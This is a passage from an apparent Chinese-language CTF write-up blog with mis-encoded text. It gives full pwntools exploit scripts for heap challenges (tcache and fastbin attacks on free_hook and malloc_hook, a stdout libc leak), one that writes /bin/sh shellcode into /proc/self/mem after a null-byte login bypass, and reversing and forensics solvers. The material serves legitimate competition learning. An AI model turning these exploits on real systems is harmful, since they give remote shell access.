†å—ï¼Œsize å¡«æˆ0xffï¼Œç•™ç€æº¢å‡º ç”³è¯·3ä¸ª0x80å¤§å°çš„å †å—ï¼Œsize å¡«æˆ0xffï¼Œç•™ç€æº¢å‡º é‡Šæ”¾å‰8ä¸ªå †ï¼Œæœ€åä¸€ä¸ªè¿›å…¥unsortbin ç”³è¯·ä¸€ä¸ª0x90çš„å †å—ï¼Œä¼šç”³è¯·åˆ°tcacheçš„å¤´çš„å †ï¼Œä¹Ÿå°±æ˜¯ç¬¬7ä¸ªå † editæº¢å‡ºä¿®æ”¹åˆ°next chunkçš„size å’Œprev sizeï¼Œè®©show å‡ºlibcä¿¡æ¯ æ¥ç€ä¿®æ”¹unsortbinçš„size ä¸º0x80ï¼Œå¼€å§‹è¿›è¡Œtcache attackï¼Œä¹Ÿå°±æ˜¯æº¢å‡ºä¿®æ”¹tcache chianä¸Šçš„å †åœ°å€ï¼Œä¿®æ”¹ä¸ºfree hook ç„¶åç”³è¯·å †åˆ°free hookï¼Œæ‰“one gadgetsexp from pwn import * import time local_file = './pwn' elf = ELF(local_file) context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('172.20.12.248',50001) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(idx,size,data): sla('4.show','1') sla('Input index:',str(idx)) sla('Input size',str(size)) sa('note',str(data)) def edit(idx,data): sla('4.show','3') sla('dex',str(idx)) sa('note',str(data)) def show(idx): sla('4.show','4') sla('dex',str(idx)) def free(idx): sla('4.show','2') sla('dex',str(idx)) for i in range(8): payload = '1' * 0x80 add(i,0xff,payload) payload = '1' * 0x70 add(10,0xff,payload) add(11,0xff,payload) add(12,0xff,payload) for i in range(7): free(i) free(7) payload = '1' * 0x80 add(6,0xff,payload) payload = '1' * 0x80 + '2' * 8 + p64(0xdeadbeefdeadbeef) edit(6,payload) show(6) ru('22222222') r(8) libc_base = uu64(r(6)) - 0x3ebca0 info_addr('libc',libc_base) payload = '1' * 0x80 + p64(0) + p64(0x81) edit(6,payload) payload = '1' * 0x70 add(13,0xff,payload) free(11) free(10) free_hook = 0x3ed8e8 + libc_base payload = '1' * 0x80 + p64(0x90) + p64(0x80) + p64(free_hook) edit(13,payload) payload = '1' * 0x70 add(14,0xff,payload) one = 0x4f3c2 + libc_base add(15,0xff,payload) edit(15,p64(one)) free(14) itr() safe shellåˆ†æç™»é™†å‡½æ•°ï¼š!strcmp(name, &amp;s) &amp;&amp; !strcmp(password, &amp;ptr); åœ¨æœ€åçš„éªŒè¯æ˜¯ç”¨strcmpï¼Œä¼šè¢«\\x00ç»™æˆªæ–­ï¼Œå¹¶ä¸”æœåŠ¡å™¨ä¸Šçš„admin.txtä¸Šæ¥ä¹Ÿæ˜¯ç©ºçš„ã€‚ç›´æ¥è®¾ç½®nameä¸passwordå‡ä¸º\\x00å³å¯ç»•è¿‡ã€‚ shellå‡½æ•°ï¼š éƒ½æ˜¯å›´ç»•/proc/self/ç›®å½•ä¸‹çš„æ“ä½œ set_lseekå¯ä»¥ä¿®æ”¹è¯»å–æŸæ–‡ä»¶æŒ‡é’ˆï¼Œä¹Ÿå°±æ˜¯openä»¥åé»˜è®¤æ“ä½œè¯»å†™æŒ‡é’ˆæ˜¯æŒ‡å‘æ–‡ä»¶çš„å¼€å¤´çš„ï¼Œé€šè¿‡å®ƒå¯ä»¥ä¿®æ”¹è¿™ä¸ªæŒ‡é’ˆçš„åœ¨è¿™ä¸ªæ–‡ä»¶ä¸ŠæŒ‡å‘ write ä¸€æ¬¡åªèƒ½å†™8å­—èŠ‚ é‡ç‚¹æ˜¯äº†è§£/proc/pid/ç›®å½•ä¸‹æ–‡ä»¶çš„ä¿¡æ¯ä¸å«ä¹‰ã€‚https://blog.csdn.net/enweitech/article/details/53391567 ç‰¹åˆ«æ³¨æ„ mmaps å’Œ mem mapsæ˜¯å½“å‰è¿›ç¨‹çš„å†…å­˜æ˜ å°„å…³ç³»ï¼Œå­˜æ”¾ç€å†…å­˜åˆ†å¸ƒå›¾ï¼Œç±»ä¼¼äºgdbä¸­vmmapï¼Œå¯ä»¥æ³„æ¼ä¸€ä¸‹ç¨‹åºçš„åŸºåœ°å€ã€‚ mem åŒ…å«äº†ç¨‹åºè¿›ç¨‹åœ¨å†…å­˜ä¸­çš„å†…å®¹ï¼› é€šè¿‡ä¿®æ”¹è¯¥æ–‡ä»¶ç›¸å½“äºç›´æ¥ä¿®æ”¹å½“å‰è¿›ç¨‹çš„å†…å­˜ / proc / $pid / memä»¥ä¸è¿›ç¨‹ä¸­ç›¸åŒçš„æ–¹å¼æ˜¾ç¤º$pidçš„å†…å­˜æ˜ å°„,å³ä¼ªæ–‡ä»¶ä¸­åç§»xå¤„çš„å­—èŠ‚ä¸è¿›ç¨‹ä¸­åœ°å€xå¤„çš„å­—èŠ‚ç›¸åŒ.ã€‚ ç»“åˆmapsçš„æ˜ å°„ä¿¡æ¯æ¥ç¡®å®šè¯»çš„åç§»å€¼ã€‚å³æ— æ³•è¯»å–æœªè¢«æ˜ å°„çš„åŒºåŸŸï¼Œåªæœ‰è¯»å–çš„åç§»å€¼æ˜¯è¢«æ˜ å°„çš„åŒºåŸŸæ‰èƒ½æ­£ç¡®è¯»å–å†…å­˜å†…å®¹ã€‚ å†™å…¥memæ–‡ä»¶ä¹Ÿç›¸å½“äºä¿®æ”¹ç¨‹åºåœ¨å†…å­˜çš„æœ¬èº«äº†ï¼Œç»“åˆmmapsçš„ç¨‹åºåŸºå€ï¼Œåœ¨åˆé€‚çš„åœ°æ–¹å†™å…¥shellcodeï¼Œè®©ç¨‹åºèµ°åˆ°è¿™é‡Œå³å¯get shell é˜²å¾¡å‡½æ•°ï¼šåœ¨ç›‘æµ‹åˆ°3æ¬¡å¯†ç é”™è¯¯åï¼Œå¼€å§‹æ‹’ç»è¿æ¥ï¼Œå¹¶ä¸”ä¼šåœ¨admin.txtä¸­å†™å…¥éšæœºçš„512ä¸ªå­—æ¯æ•°å­—ç»„åˆçš„å­—ç¬¦ã€‚è¿™æ ·å°±åŸºæœ¬ç™»é™†ä¸ä¸Šå»äº†,å› ä¸ºæ˜¯éšæœºçš„ï¼Œå¹¶ä¸”nameè·Ÿpasswordæœ€å¤§ä¹Ÿå°±æ˜¯0x100çš„é•¿åº¦ã€‚ æ”»å‡»æ€è·¯ ç»•è¿‡checkï¼Œç™»å…¥diy shell è¯»å…¥mmapsï¼Œleak å‡º ç¨‹åºçš„base open memæ–‡ä»¶ï¼Œå‡†å¤‡å†™å…¥ ç¡®å®šå†™å…¥åç§»ä¸ºhelpå0x16CC + base,é€šè¿‡set_lseekæ¥ä¿®æ”¹æŒ‡é’ˆæŒ‡å‘ wirte å†™å…¥8å­—èŠ‚shellcode é€šè¿‡set_lseekæ¥ä¿®æ”¹æŒ‡é’ˆ+8ï¼Œå†æ¬¡å†™å…¥ï¼Œå¾ªç¯å†™å¥½shellcode è¾“å…¥helpå³å¯ expfrom pwn import * import time local_file = './safe_shell' elf = ELF(local_file) context.log_level = 'debug' debug = 1 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',27411) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() sa('name','\\x00') sa('pass','\\x00') sl('readonly') sla('name','maps') s = ru('-5') s = s[2:14] base = int(s,16) info_addr('base',base) patch_addr = 0x16CC + base sl('open') sla('name','mem') shellcode = '\\x6a\\x3b\\x58\\x99\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xeb\\x08\\x53\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05' for i in range(len(shellcode)//8+1): sl('set_lseek') sla(' file offset',str(patch_addr + i*8)) sla('$','write') sa('your context',shellcode[i*8:(i*8+8)]) sl('help') itr()","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"}]},{"title":"ç¾ŠåŸæ¯2020éƒ¨åˆ†wp","slug":"ç¾ŠåŸæ¯2020éƒ¨åˆ†wp","date":"2020-09-14T12:56:01.475Z","updated":"2020-09-24T02:49:43.921Z","comments":true,"path":"2020/09/14/ç¾ŠåŸæ¯2020éƒ¨åˆ†wp/","link":"","permalink":"http://chumen77.xyz/2020/09/14/ç¾ŠåŸæ¯2020éƒ¨åˆ†wp/","excerpt":"","text":"ç¾ŠåŸæ¯2020éƒ¨åˆ†wpreloginPython exeçš„é€†å‘ã€‚å…¶ä¸­åœ¨ä¿®å¤pycæ—¶ï¼Œä¸ªäººä¸æ˜¯å¾ˆç†Ÿæ‚‰ï¼Œè®°å½•ä¸€ä¸‹ï¼š åœ¨è„±å»ä»¥åï¼Œä¼šæœ‰ä¸»ç¨‹åºï¼Œè·Ÿä¸€ä¸ªstructçš„æ–‡ä»¶ã€‚ è¦ä¿è¯ä¸»ç¨‹åºä¸structçš„å‰é¢çš„é­”æ³•å­—èŠ‚æ˜¯ç›¸åŒä¸€æ ·çš„ã€‚ é‡ç‚¹å…³æ³¨å‰16ä¸ªå­—èŠ‚ï¼Œä¿è¯ç›¸åŒå³å¯ã€‚ä¿®å¤å¥½pycåï¼Œå°±å¯ä»¥è¿›è¡Œåç¼–è¯‘ã€‚å‰©ä¸‹çš„å°±æ˜¯é€†ç®—æ³•ï¼Œéœ€è¦ç”¨åˆ°z3ã€‚ exp#!/usr/bin/env python2.7 from z3 import * ''' a1 = Int('a1') a2 = Int('a2') a3 = Int('a3') a4 = Int('a4') a5 = Int('a5') a6 = Int('a6') a7 = Int('a7') a8 = Int('a8') a9 = Int('a9') a10 = Int('a10') a11 = Int('a11') a12 = Int('a12') a13 = Int('a13') a14 = Int('a14') s.add(a1 * 88 + a2 * 67 + a3 * 65 - a4 * 5 + a5 * 43 + a6 * 89 + a7 * 25 + a8 * 13 - a9 * 36 + a10 * 15 + a11 * 11 + a12 * 47 - a13 * 60 + a14 * 29 == 22748) s.add(a1 * 89 + a2 * 7 + a3 * 12 - a4 * 25 + a5 * 41 + a6 * 23 + a7 * 20 - a8 * 66 + a9 * 31 + a10 * 8 + a11 * 2 - a12 * 41 - a13 * 39 + a14 * 17 == 7258) s.add(a1 * 28 + a2 * 35 + a3 * 16 - a4 * 65 + a5 * 53 + a6 * 39 + a7 * 27 + a8 * 15 - a9 * 33 + a10 * 13 + a11 * 101 + a12 * 90 - a13 * 34 + a14 * 23 == 26190) s.add(a1 * 23 + a2 * 34 + a3 * 35 - a4 * 59 + a5 * 49 + a6 * 81 + a7 * 25 + a8 * (2 ** 7) - a9 * 32 + a10 * 75 + a11 * 81 + a12 * 47 - a13 * 60 + a14 * 29 == 37136) s.add(a1 * 38 + a2 * 97 + a3 * 35 - a4 * 52 + a5 * 42 + a6 * 79 + a7 * 90 + a8 * 23 - a9 * 36 + a10 * 57 + a11 * 81 + a12 * 42 - a13 * 62 - a14 * 11 == 27915) s.add(a1 * 22 + a2 * 27 + a3 * 35 - a4 * 45 + a5 * 47 + a6 * 49 + a7 * 29 + a8 * 18 - a9 * 26 + a10 * 35 + a11 * 41 + a12 * 40 - a13 * 61 + a14 * 28 == 17298) s.add(a1 * 12 + a2 * 45 + a3 * 35 - a4 * 9 - a5 * 42 + a6 * 86 + a7 * 23 + a8 * 85 - a9 * 47 + a10 * 34 + a11 * 76 + a12 * 43 - a13 * 44 + a14 * 65 == 19875) s.add(a1 * 79 + a2 * 62 + a3 * 35 - a4 * 85 + a5 * 33 + a6 * 79 + a7 * 86 + a8 * 14 - a9 * 30 + a10 * 25 + a11 * 11 + a12 * 57 - a13 * 50 - a14 * 9 == 22784) s.add(a1 * 8 + a2 * 6 + a3 * 64 - a4 * 85 + a5 * 73 + a6 * 29 + a7 * 2 + a8 * 23 - a9 * 36 + a10 * 5 + a11 * 2 + a12 * 47 - a13 * 64 + a14 * 27 == 9710) s.add(a1 * 67 - a2 * 68 + a3 * 68 - a4 * 51 - a5 * 43 + a6 * 81 + a7 * 22 - a8 * 12 - a9 * 38 + a10 * 75 + a11 * 41 + a12 * 27 - a13 * 52 + a14 * 31 == 13376) s.add(a1 * 85 + a2 * 63 + a3 * 5 - a4 * 51 + a5 * 44 + a6 * 36 + a7 * 28 + a8 * 15 - a9 * 6 + a10 * 45 + a11 * 31 + a12 * 7 - a13 * 67 + a14 * 78 == 24065) s.add(a1 * 47 + a2 * 64 + a3 * 66 - a4 * 5 + a5 * 43 + a6 * 112 + a7 * 25 + a8 * 13 - a9 * 35 + a10 * 95 + a11 * 21 + a12 * 43 - a13 * 61 + a14 * 20 == 27687) s.add(a1 * 89 + a2 * 67 + a3 * 85 - a4 * 25 + a5 * 49 + a6 * 89 + a7 * 23 + a8 * 56 - a9 * 92 + a10 * 14 + a11 * 89 + a12 * 47 - a13 * 61 - a14 * 29 == 29250) s.add(a1 * 95 + a2 * 34 + a3 * 62 - a4 * 9 - a5 * 43 + a6 * 83 + a7 * 25 + a8 * 12 - a9 * 36 + a10 * 16 + a11 * 51 + a12 * 47 - a13 * 60 - a14 * 24 == 15317) if s.check() == sat: result = s.model() print result ''' ''' [a2 = 24, a13 = 88, a6 = 43, a9 = 52, a14 = 33, a5 = 104, a12 = 74, a7 = 28, a1 = 119, a10 = 108, a11 = 88, a8 = 91, a4 = 7, a3 = 10] ''' key = [10,24,119,7,104,43,28,91,108,52,88,74,88,33] flag = ' ' for i in range(13,0,-1): key[i-1] = key[i] ^ key[i - 1] flag += chr(key[i-1]) flag = flag[::-1] flag += chr(33) print(flag) å…¶ä¸­åœ¨z3ä¸­å¤„ç†é€»è¾‘è¿ç®—æ—¶ï¼Œæ˜¯å¾ˆç‰¹æ®Šçš„ï¼Œè¿™ä¸ªéœ€è¦æ³¨æ„ï¼Œå…·ä½“å¯ä»¥çœ‹z3çš„å®˜æ–¹æ–‡æ¡£ã€‚å¯ä»¥å‚è€ƒï¼šhttps://arabelatso.github.io/2018/06/14/Z3%20API%20in%20Python/ è¿˜æœ‰é‡åˆ°é€»è¾‘å·¦ç§»å³ç§»ï¼š 1. â€œ&gt;&gt;â€ int x = 16; printf(\"%d\\n\", x &gt;&gt; 1); å…ˆå°†xè½¬æˆäºŒè¿›åˆ¶ 10000, ä¸è¯»æœ€åä¸€ä½ï¼Œ è¾“å‡º 1000ï¼Œ å³ä¸º8; å³ç§»ä¸€ä½ç›¸å½“äºæ•°å€¼é™¤ä»¥2 2. â€œ&lt;&lt;â€ int x = 16; printf(\"%d\\n\", x &lt;&lt; 1); å…ˆå°†xè½¬æˆäºŒè¿›åˆ¶ 10000, å¾€æœ€åå†è¯»å–ä¸€ä½(0, æˆ–æ ¹æ®æ˜¯å¦å·²ç»æœ‰ç§»ä½)ï¼Œ è¾“å‡º 100000ï¼Œ å³ä¸º32; å·¦ç§»ï¼Œè‹¥ç§»åŠ¨ä½æ•°Kç­‰äºæˆ–å¤§äºæ•°æ®é•¿åº¦N,é€šå¸¸åªç§»åŠ¨K mod N ä½æ•° å·¦ç§»ä¸€ä½ç›¸å½“äºæ•°å€¼ä¹˜ä»¥2 åœ¨è¿™é‡Œæ˜¯å·¦ç§»7ï¼Œä¹Ÿå°±æ˜¯ä¹˜ 2 çš„7æ¬¡æ–¹ã€‚ easyreåˆ†æ3å±‚åŠ å¯†. ä¸€ä¸ªbase64 ä¸€ä¸ªä»¥13å­—èŠ‚ï¼Œåˆ†å‰²å­—ç¬¦ï¼Œè¿›è¡Œç§»ä½ å•å­—èŠ‚å‡¯æ’’åŠ å¯†ï¼Œä½†æ˜¯ä¹ŸåŠ å…¥äº†å¯¹æ•°å­—çš„å¤„ç† expimport base64 key = 'EmBmP5Pmn7QcPU4gLYKv5QcMmB3PWHcP5YkPq3=cT6QckkPckoRG' key = [ord(c) for c in key] buf = [0]*52 for i in range(len(key)): if key[i] &gt; 64 and key[i] &lt;=90: buf[i] = (key[i] - 65 - 3) % 26 + 65 continue if key[i] &gt; 96 and key[i] &lt;=122: buf[i] = (key[i] - 97 - 3) % 26 + 0x61 continue if key[i] &gt; 47 and key[i] &lt;=57: buf[i] = (key[i] - 48 - 3) % 10 + 48 continue buf[i] = key[i] buf = [chr(c) for c in buf] key2 = '' for i in buf: key2 += i key2 = key2[13:26] + key2[39:52] + key2[:13] + key2[26:39] flag = base64.b64decode(key2) print(flag) pwnsing inå…¥é—¨å †é¢˜ï¼Œå­˜åœ¨uafï¼Œè¿›è¡Œfastbin attcakå³å¯ã€‚ expfrom pwn import * import time local_file = './pwn' elf = ELF(local_file) context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('183.129.189.60',10029) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(size,name,mes): sla('Your choice :','1') sla('size',str(size)) sa('name',str(name)) sla('mes',str(mes)) def show(): sla('Your choice :','2') def free(idx): sla('Your choice :','3') sla('index:',str(idx)) payload = 'a' * 0x60 mes = 'b' * 23 add(0x100,payload,mes) add(0x60,payload,mes) free(0) add(0x60,' ',mes) show() ru(\"Game[2]'s name :\") libc_base = uu64(r(6)) - 0x3c4b20 info_addr('libc_base',libc_base) free(2) free(1) free(2) malloc_hook = libc_base + 0x3c4aed add(0x60,p64(malloc_hook),p64(malloc_hook)) add(0x60,p64(malloc_hook),p64(malloc_hook)) add(0x60,p64(malloc_hook),p64(malloc_hook)) one = 0x4527a + libc_base payload = '1' * 11 + p64(0) + p64(one) add(0x60,payload,payload) itr() å…¶ä¸­å¯ä»¥ç”³è¯·ä¸€ä¸ªå †ï¼Œè¿›è¡Œgetshellï¼Œä¹Ÿå¯ä»¥åŒæ—¶2æ¬¡freeåŒä¸€ä¸ªchunkï¼Œè§¦å‘æŠ¥é”™å‡½æ•°ï¼Œè€Œè°ƒç”¨æŠ¥é”™å‡½æ•°çš„æ—¶å€™åˆä¼šç”¨åˆ°malloc_hookï¼Œä»è€Œgetshellã€‚ babypwnç¨‹åºåˆ†æ åªæœ‰addå’ŒdelåŠŸèƒ½ å­˜åœ¨uaf åªèƒ½ç”³è¯·&lt;0x70çš„å †å— å‰ç½®æŠ€èƒ½éœ€è¦åˆ©ç”¨scanfå‡½æ•°æ¥è§¦å‘malloc_consolidateï¼Œä½¿ç›¸é‚»fastbinå †å—è¿›è¡Œåˆå¹¶ï¼Œå¹¶æ”¾å…¥unsortedbinçš„ é˜Ÿåˆ—ã€‚ å‚è€ƒé“¾æ¥ï¼š https://www.anquanke.com/post/id/176139 https://blog.csdn.net/plus_re/article/details/79265805 malloc_consolidateå…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼š åˆ¤æ–­fastbinæ˜¯å¦åˆå§‹åŒ–ï¼Œå¦‚æœæœªåˆå§‹åŒ–ï¼Œåˆ™è¿›è¡Œåˆå§‹åŒ–ç„¶åé€€å‡ºã€‚ æŒ‰ç…§fastbinç”±å°åˆ°å¤§çš„é¡ºåºï¼ˆ0x20 ,0x30 ,0x40è¿™ä¸ªé¡ºåºï¼‰åˆå¹¶chunkï¼Œæ¯ç§ç›¸åŒå¤§å°çš„fastbinä¸­chunkçš„å¤„ç†é¡ºåºæ˜¯ä»fastbin-&gt;fdå¼€å§‹å–ï¼Œä¸‹ä¸€ä¸ªå¤„ç†çš„æ˜¯p-&gt;fdï¼Œä¾æ¬¡ç±»æ¨ã€‚ é¦–å…ˆå°è¯•åˆå¹¶pre_chunkã€‚ ç„¶åå°è¯•åˆå¹¶next_chunkï¼šå¦‚æœnext_chunkæ˜¯top_chunkï¼Œåˆ™ç›´æ¥åˆå¹¶åˆ°top_chunkï¼Œç„¶åè¿›è¡Œç¬¬å…­æ­¥ï¼›å¦‚æœnext_chunkä¸æ˜¯top_chunkï¼Œå°è¯•åˆå¹¶ã€‚ å°†å¤„ç†å®Œçš„chunkæ’å…¥åˆ°unsorted binå¤´éƒ¨ã€‚ è·å–ä¸‹ä¸€ä¸ªç©ºé—²çš„fastbinï¼Œå›åˆ°ç¬¬äºŒæ­¥ï¼Œç›´åˆ°æ¸…ç©ºæ‰€æœ‰fastbinä¸­çš„chunkï¼Œç„¶åé€€å‡ºã€‚ æ”»å‡»æ€è·¯ åˆ©ç”¨scanfå‡½æ•°æ¥è§¦å‘malloc_consolidateï¼Œä½¿ç›¸é‚»fastbinå †å—è¿›è¡Œåˆå¹¶ï¼Œå¹¶æ”¾å…¥unsortedbinçš„ é˜Ÿåˆ—ï¼Œåœ¨å †ä¸Šç•™ä¸‹libcçš„ç›¸å…³åœ°å€ åˆ©ç”¨fastbin attack ï¼Œæ‰“__IO_2_1_stdoutï¼Œæ³„æ¼libc åˆ©ç”¨fastbin attack ï¼Œæ‰“malloc_hook éš¾ç‚¹åœ¨ç”³è¯·å †å—çš„æ•°é‡,é¢˜ç›®é™åˆ¶äº†19ä¸ªï¼Œæ˜¯åˆšåˆšå¤Ÿç”¨ã€‚ expfrom pwn import * import time local_file = './pwn' elf = ELF(local_file) context.log_level = 'debug' debug = 1 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',27411) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(size,name,mes): sla('Your choice :','1') sla('size',str(size)) sa(\"game's name:\",str(name)) sla('mes',str(mes)) def free(idx): sla('Your choice :','2') sla('index:',str(idx)) def leak_addr(): payload = 'a' * 0x28 mes = '2' * 23 add(0x28,payload,mes) #0 add(0x28,payload,mes) #1 add(0x28,payload,mes) #2 free(0) free(1) free(2) add(0x68,payload,mes) #3 add(0x68,payload,mes) #4 add(0x68,payload,mes) #5 add(0x68,payload,mes) #6 free(3) free(4) free(5) # debug() sla('Your choice :','2') sl('1'*0x500) free(0) free(1) free(2) add(0x68,p16(0xb5dd),'1') #7 add(0x68,p16(0xb5dd),'1') #8 free(6) free(7) free(6) add(0x68,p8(0x90),'1') #9 add(0x68,'1','1') #10 add(0x68,'1','1') #11 add(0x68,'1','1') #12 payload = 'b' * 0x33 + p64(0xfbad3c80) + p64(0) * 3 + p8(0) sla('Your choice :','1') sla('size','104') #13 sa('name',payload) leak = 0 while True: try: leak_addr() ss = io.recvuntil(chr(0x7f),timeout = 0.5) if len(ss) == 0: raise Exception('') io.recv(10) leak = uu64(r(6)) if leak == 0x7ff81b57b6a3: raise Exception('') break except Exception: io.close() io = process('./pwn') # io = remote('39.101.184.181',10000) continue info_addr('leak',leak) libc_addr = leak - 0x3c56a3 info_addr('libc_base',libc_addr) ru('age') sl('1') free(10) free(11) free(10) malloc_hook = 0x3c4aed + libc_addr add(0x68,p64(malloc_hook),'1') add(0x68,'1','1') add(0x68,'1','1') one_rec = 0xf0364 + libc_addr payload = '1' * (0x13-8) + p64(0)+ p64(one_rec) add(0x68,payload,'1') free(6) free(6) itr()","categories":[],"tags":[{"name":"re","slug":"re","permalink":"http://chumen77.xyz/tags/re/"},{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"}]},{"title":"2020 â€œä¸­èƒ½èåˆæ¯â€ éƒ¨åˆ†wp","slug":"2020 â€œä¸­èƒ½èåˆæ¯â€ éƒ¨åˆ†wp","date":"2020-09-12T09:15:09.106Z","updated":"2020-09-17T09:36:44.436Z","comments":true,"path":"2020/09/12/2020 â€œä¸­èƒ½èåˆæ¯â€ éƒ¨åˆ†wp/","link":"","permalink":"http://chumen77.xyz/2020/09/12/2020 â€œä¸­èƒ½èåˆæ¯â€ éƒ¨åˆ†wp/","excerpt":"","text":"å·¥æ§wpICS_8å°±æ˜¯ä¸€ä¸ªç®—æ³•çš„é€†å‘ã€‚ #!/usr/bin/env python2.7 import struct import base64 cypher_text = 'HgoAVxEfdCRlPytBA1JSHiVOZW4VMURPcANETw==' iv = struct.unpack(\"I\", 'x1a0')[0] def decode(cypher_text,iv): cypher_text = base64.b64decode(cypher_text) padding = 4 - len(cypher_text) % 4 if padding != 0: cypher_text = cypher_text + \"\\x00\" * padding l = cypher_text crypher = struct.unpack(\"I\"*(len(l)/4),l) datas = [] datas += [ decrypto(crypher[0]) ^ iv ] for i in range(1,len(crypher)): datas += [decrypto(crypher[i]) ^ crypher[i-1]] return datas def decrypto(data): return data ^ (data &gt;&gt; 16) datas = decode(cypher_text,iv) flag = \"\" for i in datas: flag += struct.pack(\"I\",i) print flag ICS_9è§£å‹ä»¥åæ˜¯ä¸€ä¸ªimgï¼Œä½†æ˜¯å‘ç°æ˜¯æŸåçš„ã€‚ file ./ICS_9.img ./ICS_9.img: Linux rev 1.0 ext4 filesystem data, UUID=1385df22-b2ce-4b4f-858e-79ae1932ca1a (extents) (huge files) å¯ä»¥çœ‹åˆ°æ˜¯ext4çš„æ–‡ä»¶ã€‚ç„¶åå¯ä»¥ç”¨fsckä¿®å¤ä¸€ä¸‹ï¼š fsck.ext4 ./ICS_9.img e2fsck 1.42.13 (17-May-2015) ext2fs_open2: The ext2 superblock is corrupt fsck.ext4: Superblock invalid, trying backup blocks... ./ICS_9.img was not cleanly unmounted, check forced. Pass 1: Checking inodes, blocks, and sizes Pass 2: Checking directory structure Pass 3: Checking directory connectivity Pass 4: Checking reference counts Pass 5: Checking group summary information Free blocks count wrong for group #0 (6789, counted=488). Fix&lt;y&gt;? yes Free blocks count wrong for group #1 (2006, counted=228). Fix&lt;y&gt;? yes Free blocks count wrong (8795, counted=716). Fix&lt;y&gt;? yes Free inodes count wrong for group #0 (1269, counted=1262). Fix&lt;y&gt;? yes Free inodes count wrong (2549, counted=2542). Fix&lt;y&gt;? yes ./ICS_9.img: ***** FILE SYSTEM WAS MODIFIED ***** ./ICS_9.img: 18/2560 files (11.1% non-contiguous), 9524/10240 blocks ç„¶åè¿›è¡ŒæŒ‚è½½: mkdir tmp2 sudo mount ICS_9.img tmp2 ; ls -larth tmp2 binwalk fil.enc Scan Time: 2015-03-09 15:35:08 Target File: /tmp/wu/tmp/fil.enc MD5 Checksum: cb84f2cc7d776e83ebe0bd17efa163f4 Signatures: 328 DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 OpenSSL encryption, salted, salt: 0x-6BC6193B4330E12E cat AE5 4[71A3j9[\\22?/+u0 Binwalk ä¸€ä¸‹ï¼Œå‘ç°encæ–‡ä»¶æ˜¯opensslåŠ å¯†çš„æ–‡ä»¶ï¼ŒAE5æ–‡ä»¶æ˜¯å…³äºåŠ å¯†ç®—æ³•å’Œå¯†é’¥ã€‚ ä½†æ˜¯å¹¶ä¸çŸ¥é“æ˜¯å“ªç§æ¨¡å¼çš„åŠ å¯†å’Œå¯†é’¥çš„é•¿åº¦çš„åŠ å¯†ï¼Œéœ€è¦å†™ä¸€ä¸ªè„šæœ¬æµ‹è¯•ã€‚è¿™æ˜¯æ‰€æœ‰çš„å¯èƒ½ï¼š -aes-128-cbc -aes-128-cbc-hmac-sha1 -aes-128-cfb -aes-128-cfb1 -aes-128-cfb8 -aes-128-ctr -aes-128-ecb -aes-128-gcm -aes-128-ofb -aes-128-xts -aes-192-cbc -aes-192-cfb -aes-192-cfb1 -aes-192-cfb8 -aes-192-ctr -aes-192-ecb -aes-192-gcm -aes-192-ofb -aes-256-cbc -aes-256-cbc-hmac-sha1 -aes-256-cfb -aes-256-cfb1 